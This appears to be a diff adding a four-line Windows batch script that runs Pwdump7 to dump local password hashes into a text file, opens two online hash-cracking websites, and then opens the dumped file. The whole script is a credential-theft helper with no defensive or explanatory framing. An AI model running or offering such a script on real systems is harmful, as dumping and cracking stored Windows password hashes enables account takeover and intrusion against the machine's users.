@@ -1,0 +1,4 @@
+Pwdump7.exe >pass.txt
+start http://www.objectif-securite.ch/en/products.php
+start http://cracker.offensive-security.com/index.php
+pass.txt
